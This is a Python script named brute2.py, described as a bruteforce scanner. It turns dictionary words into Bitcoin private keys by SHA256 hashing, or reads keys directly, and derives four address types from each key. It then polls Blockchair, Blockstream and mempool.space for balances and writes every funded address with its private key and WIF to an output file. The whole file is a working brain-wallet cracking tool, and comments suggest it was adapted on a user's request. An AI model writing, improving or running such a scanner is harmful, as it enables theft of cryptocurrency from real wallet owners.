#!/usr/bin/env python3
# brute2.py
# Modified from provided script for synchronous, iSH-friendly use.
# Defaults: dictionary.txt, found.txt
# Checks only balances (no 'received'). Uses blockchair, blockstream, mempool.space

from __future__ import annotations
import io, sys, argparse, logging, time, binascii, hashlib, json, os, random
import requests

# crypto libs
try:
    import ecdsa
    import base58
except Exception as e:
    print("Missing dependencies. Install: pip3 install requests ecdsa base58")
    raise

# optional coincurve for taproot
try:
    import coincurve
    HAVE_COINCURVE = True
except Exception:
    HAVE_COINCURVE = False

# --- minimal bech32 / segwit helpers (BIP173/BIP350) ---
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
def bech32_polymod(values):
    GENERATORS = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for v in values:
        top = chk >> 25
        chk = ((chk & 0x1ffffff) << 5) ^ v
        for i in range(5):
            if ((top >> i) & 1):
                chk ^= GENERATORS[i]
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data, spec='bech32'):
    const = 1 if spec == 'bech32' else 0x2bc830a3
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0]*6) ^ const
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp, data, spec='bech32'):
    combined = data + bech32_create_checksum(hrp, data, spec=spec)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0; bits = 0; ret = []; maxv = (1 << tobits) - 1
    for value in data:
        if value < 0 or (value >> frombits):
            return None
        acc = (acc << frombits) | value
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def segwit_addr_encode(hrp, witver, witprog):
    if witver < 0 or witver > 16 or len(witprog) < 2 or len(witprog) > 40:
        return None
    data = [witver] + convertbits(list(witprog), 8, 5)
    spec = 'bech32' if witver == 0 else 'bech32m'
    return bech32_encode(hrp, data, spec=spec)

# ------------------ Wallet (no coinkit) ------------------
class Wallet:
    """
    Wallet(passphrase, is_private_key=False)
    - if is_private_key: accepts hex privkey or WIF
    - else: SHA256(passphrase) -> priv key
    Exposes:
      - private_key (hex)
      - wif
      - addresses dict: p2pkh, p2wpkh, p2sh-p2wpkh, p2tr (maybe None)
    """
    def __init__(self, passphrase, is_private_key=False):
        self.passphrase = passphrase
        self.is_private_key = bool(is_private_key)
        if self.is_private_key:
            if self._looks_like_hex(self.passphrase):
                self.private_key = self.passphrase.lower()
            else:
                self.private_key = self._wif_to_hex(self.passphrase)
        else:
            # derive from passphrase
            self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
        self.wif = self._hex_to_wif(self.private_key)
        self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
        self.addresses = {}
        self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)
        self.addresses['p2wpkh'] = self._p2wpkh_bech32(self.pubkey_compressed)
        self.addresses['p2sh-p2wpkh'] = self._p2sh_p2wpkh(self.pubkey_compressed)
        self.addresses['p2tr'] = self._maybe_p2tr()

    def _looks_like_hex(self, s):
        try:
            int(s, 16)
            return len(s) in (64, 66)
        except Exception:
            return False

    def _hex_to_wif(self, priv_hex, compressed=True):
        b = binascii.unhexlify(priv_hex)
        payload = b'\x80' + b
        if compressed:
            payload += b'\x01'
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()

    def _wif_to_hex(self, wif):
        try:
            raw = base58.b58decode(wif)
            payload = raw[:-4]
            if len(payload) == 34 and payload[-1] == 0x01:
                key = payload[1:-1]
            else:
                key = payload[1:]
            return binascii.hexlify(key).decode()
        except Exception:
            return ""

    def _priv_to_compressed_pubkey(self, priv_hex):
        priv = binascii.unhexlify(priv_hex)
        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        px = vk.to_string()
        x = px[:32]; y = px[32:]
        prefix = b'\x02' if (y[-1] % 2 == 0) else b'\x03'
        return prefix + x

    def _hash160(self, data_bytes):
        return hashlib.new('ripemd160', hashlib.sha256(data_bytes).digest()).digest()

    def _p2pkh_from_pubkey(self, pubkey_bytes):
        rip = self._hash160(pubkey_bytes)
        pref = b'\x00' + rip
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def _p2wpkh_bech32(self, pubkey_bytes):
        witprog = self._hash160(pubkey_bytes)
        return segwit_addr_encode("bc", 0, witprog)

    def _p2sh_p2wpkh(self, pubkey_bytes):
        witprog = self._hash160(pubkey_bytes)
        redeem = b'\x00\x14' + witprog
        redeem_hash = hashlib.new('ripemd160', hashlib.sha256(redeem).digest()).digest()
        pref = b'\x05' + redeem_hash
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def _maybe_p2tr(self):
        if not HAVE_COINCURVE:
            return None
        try:
            priv_bytes = binascii.unhexlify(self.private_key)
            pub = coincurve.PublicKey.from_valid_secret(priv_bytes)
            full = pub.format(compressed=False)
            x = full[1:33]
            def tagged_hash(tag, msg):
                tag_hash = hashlib.sha256(tag.encode()).digest()
                return hashlib.sha256(tag_hash + tag_hash + msg).digest()
            tweak = tagged_hash("TapTweak", x)
            Q = pub.add(tweak)
            Q_raw = Q.format(compressed=False)
            Qx = Q_raw[1:33]
            return segwit_addr_encode("bc", 1, Qx)
        except Exception:
            return None

    def __repr__(self):
        return "<Wallet priv=%s addr_p2wpkh=%s>" % (self.private_key[:8], self.addresses.get('p2wpkh'))

# ------------------ BaseBlockExplorer & concrete classes ------------------

class BaseBlockExplorer(object):
    def __init__(self):
        self.session = None
        self._base_url = None
        self._base_url_balance = None
        self._balance_suffix = ''

    def open_session(self):
        logging.info("Opening new session")
        self.session = requests.Session()
        # set a reasonable user-agent to avoid some blocks
        self.session.headers.update({"User-Agent": "brute2/1.0 (+https://example)"})
        return

    def close_session(self):
        logging.debug("Closing session")
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
        self.session = None

    def _get(self, url, timeout=15):
        r = self.session.get(url, timeout=timeout)
        # if HTML return, raise to avoid mis-parsing
        ctype = r.headers.get("Content-Type", "")
        text = r.text.strip()
        if "text/html" in ctype or (text.startswith("<!DOCTYPE") or text.startswith("<html")):
            raise Exception("HTML response received (likely blocked or changed API): " + (text[:200] if len(text) < 200 else text[:200]))
        r.raise_for_status()
        return r

    def _parse_numeric_from_response(self, response):
        text = response.text.strip()
        # try direct float/int
        try:
            return float(text)
        except Exception:
            pass
        # try JSON
        try:
            j = response.json()
            # try common keys
            for key in ("total_received", "totalReceived", "final_balance", "finalBalance", "balance", "balanceSat", "balance_satoshi", "received"):
                v = None
                if isinstance(j, dict):
                    v = j.get(key)
                if v is not None:
                    return float(v)
            # blockchair format: {"data": { "ADDRESS": {"address": {"received": ...}}}}
            if isinstance(j, dict) and "data" in j:
                try:
                    inner = next(iter(j["data"].values()))
                    if isinstance(inner, dict):
                        addr = inner.get("address", {})
                        for k in ("balance", "received"):
                            if k in addr:
                                return float(addr.get(k))
                except Exception:
                    pass
        except Exception:
            pass
        # fallback: if it's just a number-like string inside text
        try:
            num = ''.join(ch for ch in text if (ch.isdigit() or ch in "."))
            if num:
                return float(num)
        except Exception:
            pass
        raise Exception("Unable to parse numeric from response: " + (text[:200] if text else "<empty>"))

    def get_balance(self, public_address):
        if not self.session:
            raise Exception("open_session first")
        url = "{}/{}{}".format(self._base_url_balance, public_address, self._balance_suffix)
        r = self._get(url)
        num = self._parse_numeric_from_response(r)
        return num

# --- New explorer implementations: Blockchair, Blockstream, Mempool.space ---

class Blockchair(BaseBlockExplorer):
    STRING_TYPE = "blockchair"
    def __init__(self):
        super().__init__()
        # blockchair dashboard endpoint
        self._base_url = "https://api.blockchair.com/bitcoin"
        self._base_url_balance = "{}/dashboards/address".format(self._base_url)
        self._balance_suffix = ""  # complete url: /dashboards/address/{address}

    def get_balance(self, public_address):
        url = "{}/{}{}".format(self._base_url_balance, public_address, self._balance_suffix)
        r = self._get(url)
        try:
            j = r.json()
            # blockchair: j['data'][ADDRESS]['address']['balance'] (satoshis)
            data = j.get("data", {})
            if public_address in data:
                addrobj = data[public_address].get("address", {})
                # common keys
                for k in ("balance", "balance_sat", "balance_satoshi"):
                    if k in addrobj:
                        return float(addrobj[k])
                # fallback: maybe 'received' etc
                for k in ("received","total_received"):
                    if k in addrobj:
                        return float(addrobj[k])
            # fallback to generic parser
            return self._parse_numeric_from_response(r)
        except Exception as e:
            raise

class Blockstream(BaseBlockExplorer):
    STRING_TYPE = "blockstream"
    def __init__(self):
        super().__init__()
        self._base_url = "https://blockstream.info/api"
        self._base_url_balance = "{}/address".format(self._base_url)  # /address/{address}
        self._balance_suffix = ""  # we'll compute from chain_stats

    def get_balance(self, public_address):
        url = "{}/{}{}".format(self._base_url_balance, public_address, self._balance_suffix)
        r = self._get(url)
        try:
            j = r.json()
            # blockstream returns chain_stats: funded_txo_sum, spent_txo_sum
            cs = j.get("chain_stats", {})
            funded = cs.get("funded_txo_sum")
            spent = cs.get("spent_txo_sum")
            if funded is not None and spent is not None:
                bal = float(funded) - float(spent)  # satoshis
                return bal
            # fallback keys
            for k in ("balance","balanceSat","balance_satoshi"):
                if k in j:
                    return float(j[k])
            return self._parse_numeric_from_response(r)
        except Exception:
            return self._parse_numeric_from_response(r)

class MempoolSpace(BaseBlockExplorer):
    STRING_TYPE = "mempool"
    def __init__(self):
        super().__init__()
        # Use public mempool.space API for BTC mainnet
        self._base_url = "https://mempool.space"
        self._base_url_balance = "{}/api/address".format(self._base_url)  # /api/address/{address}
        self._balance_suffix = ""  # we'll compute from chain_stats

    def get_balance(self, public_address):
        url = "{}/{}{}".format(self._base_url_balance, public_address, self._balance_suffix)
        r = self._get(url)
        try:
            j = r.json()
            cs = j.get("chain_stats", {})
            funded = cs.get("funded_txo_sum")
            spent = cs.get("spent_txo_sum")
            if funded is not None and spent is not None:
                bal = float(funded) - float(spent)
                return bal
            # fallback
            return self._parse_numeric_from_response(r)
        except Exception:
            return self._parse_numeric_from_response(r)

# ------------------ Helper to create explorers ------------------

def create_explorer(kind):
    k = kind.lower().strip()
    if k == 'blockchair':
        return Blockchair()
    if k == 'blockstream':
        return Blockstream()
    if k in ('mempool','mempoolspace'):
        return MempoolSpace()
    raise ValueError("Unsupported explorer: " + kind)

# ------------------ Main scanning CLI ------------------

def main():
    parser = argparse.ArgumentParser(description='iSH-friendly bruteforce scanner (brute2).')
    parser.add_argument('-t', '--types', default='blockchair,blockstream,mempool',
                        help='Comma list of explorers to use in order (default: blockchair,blockstream,mempool)')
    parser.add_argument('-d', '--dict_file', default='dictionary.txt', help='Dictionary file (utf-8 lines). Default: dictionary.txt')
    parser.add_argument('-o', '--output_file', default='found.txt', help='Output CSV file. Default: found.txt')
    parser.add_argument('-k', '--is_private_key', action='store_true', help='Treat lines as private keys (hex or WIF)')
    parser.add_argument('--sleep', type=float, default=0.05, help='sleep (s) between requests (default 0.05)')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    parser.add_argument('--max-retries', type=int, default=3, help='Max retries per request (default 3)')
    parser.add_argument('--timeout', type=float, default=10.0, help='HTTP timeout seconds (default 10)')
    args = parser.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO,
                        format='%(asctime)s %(levelname)-6s line %(lineno)-4s %(message)s')

    # build explorers list (in order)
    explorer_names = [x.strip() for x in args.types.split(',') if x.strip()]
    explorers = []
    for name in explorer_names:
        try:
            ex = create_explorer(name)
            ex.open_session()
            explorers.append((name, ex))
            logging.info("Using explorer: %s", name)
        except Exception as e:
            logging.error("Failed to create/open explorer %s: %s", name, e)
            # don't exit; skip unavailable explorers
    if not explorers:
        logging.error("No valid explorers available. Exiting.")
        sys.exit(1)

    # Validate dict file
    try:
        with io.open(args.dict_file, 'rt', encoding='utf-8') as f:
            f.read(4096)
    except Exception as e:
        logging.error("Failed to open dict file %s : %s", args.dict_file, e)
        sys.exit(1)
    f_dictionary = io.open(args.dict_file, 'rt', encoding='utf-8')

    # Prepare output
    header = 'dictionary_word,address_type,address,current_balance_btc,private_hex,wif'
    try:
        fout = open(args.output_file, 'w', encoding='utf-8')
        fout.write(header + '\n')
    except Exception as e:
        logging.error("Failed to open output file %s : %s", args.output_file, e)
        sys.exit(1)

    # constants for retry/backoff
    max_retries = max(1, int(args.max_retries))
    base_backoff = 0.5
    max_backoff_sleep = 5.0

    # Loop dictionary (synchronous — no workers)
    for raw in f_dictionary:
        word = raw.rstrip('\n\r')
        if not word:
            continue
        logging.debug("processing: %s", word)
        try:
            wallet = Wallet(word, is_private_key=args.is_private_key)
        except Exception as e:
            logging.warning("Failed to create wallet for '%s': %s", word, e)
            continue

        # check each address family in priority order (we keep same default ordering as your old script)
        wanted_families = ['p2wpkh', 'p2sh-p2wpkh', 'p2pkh', 'p2tr']
        for atype in wanted_families:
            addr = wallet.addresses.get(atype)
            if not addr:
                logging.debug("address type %s not available for %s", atype, word)
                continue

            # For each explorer in order, attempt to get balance.
            # We will not mark as unused lightly: if an explorer errors we retry with backoff up to max_retries.
            # If any explorer returns balance>0 we record it immediately (and still attempt to write details).
            balance_found = 0.0
            explorer_success = False
            for ename, explorer in explorers:
                retry = 0
                backoff = base_backoff
                got_balance = None
                while retry < max_retries:
                    try:
                        logging.debug("Query %s for %s (%s) attempt %d", ename, addr, atype, retry+1)
                        bal_raw = explorer.get_balance(addr)
                        # Convert heuristics (some explorers return sats)
                        if bal_raw > 1000000000:  # huge -> sats
                            bal = float(bal_raw) / 1e8
                        elif bal_raw > 1 and bal_raw < 1000000000:
                            if float(bal_raw).is_integer():
                                bal = float(bal_raw) / 1e8
                            else:
                                bal = float(bal_raw)
                        else:
                            bal = float(bal_raw)
                        got_balance = bal
                        explorer_success = True
                        logging.debug("Explorer %s returned balance %f for %s", ename, bal, addr)
                        break
                    except Exception as e:
                        retry += 1
                        sleep = min(max_backoff_sleep, backoff * (2 ** (retry-1)) * (0.5 + random.random()))
                        logging.warning("Error fetching balance from %s for %s (%s): %s — retry %d/%d sleeping %.2fs",
                                        ename, addr, atype, e, retry, max_retries, sleep)
                        time.sleep(sleep)
                # polite sleep between explorers to reduce rate-limit risk
                time.sleep(args.sleep)
                if got_balance is None:
                    logging.debug("Explorer %s failed entirely for %s; continuing to next explorer", ename, addr)
                    continue
                # if any explorer reports > 0, accept as found.
                if got_balance > 0.0:
                    balance_found = got_balance
                    # write out and print
                    out_line = "{word},{atype},{addr},{balance:.8f},{priv},{wif}".format(
                        word=word, atype=atype, addr=addr,
                        balance=balance_found, priv=wallet.private_key, wif=wallet.wif)
                    logging.info("FOUND: %s", out_line)
                    print("FOUND:", out_line)
                    fout.write(out_line + '\n'); fout.flush()
                    # polite sleep after found
                    time.sleep(args.sleep)
                    break  # stop checking other explorers for this address family
                else:
                    # got zero from this explorer; continue to next explorer to be sure
                    logging.debug("Explorer %s reported zero for %s", ename, addr)
                    continue

            # If we found a positive balance for this address family, optionally skip other families for this word.
            # You asked "dont skip anything" but also "no skip unless sure". We will not skip other families automatically:
            # keep checking remaining families (they could also have balance).
            # (If you want to stop after first found for a word, uncomment the next two lines)
            # if balance_found > 0.0:
            #     break

    # cleanup
    for _, ex in explorers:
        try:
            ex.close_session()
        except Exception:
            pass
    fout.close()
    f_dictionary.close()
    logging.info("Done.")

if __name__ == '__main__':
    main()